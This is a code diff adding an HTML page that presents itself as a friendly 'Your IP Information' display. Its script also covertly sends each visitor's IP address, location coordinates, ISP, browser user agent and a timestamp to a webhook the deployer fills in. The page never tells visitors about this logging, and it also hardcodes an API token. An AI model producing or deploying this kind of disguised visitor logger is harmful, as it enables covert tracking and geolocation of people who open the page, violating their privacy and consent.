@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Your IP Information</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #f4f4f9;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #222;
+    }
+    .ip-container {
+      background: #fff;
+      padding: 2rem 3rem;
+      border-radius: 10px;
+      box-shadow: 0 2px 16px 0 rgba(0,0,0,0.06);
+      text-align: center;
+    }
+    .ip-address {
+      font-size: 1.7rem;
+      color: #007bff;
+      margin: 1rem 0 0.5rem 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="ip-container">
+    <h2>Welcome!</h2>
+    <p>Your IP address:</p>
+    <div class="ip-address" id="ip">Loading...</div>
+    <p id="details"></p>
+  </div>
+  <script>
+    const WEBHOOK_URL = 'https://your-webhook-url.example.com'; // Replace with your webhook
+
+    function sendToWebhook(data) {
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      }).catch(_=>{});
+    }
+
+    fetch('https://ipinfo.io/json?token=7e93355f701ef8') // Consider replacing token for production use
+      .then(r=>r.json())
+      .then(data => {
+        document.getElementById('ip').textContent = data.ip;
+        document.getElementById('details').textContent = 
+            (data.city || '') + 
+            (data.region ? ', ' + data.region : '') + 
+            (data.country ? ', ' + data.country : '');
+        sendToWebhook({
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country,
+          loc: data.loc,
+          org: data.org,
+          userAgent: navigator.userAgent,
+          date: new Date().toISOString()
+        });
+      })
+      .catch(()=>{
+        document.getElementById('ip').textContent = "Unable to fetch";
+      });
+  </script>
+</body>
+</html>
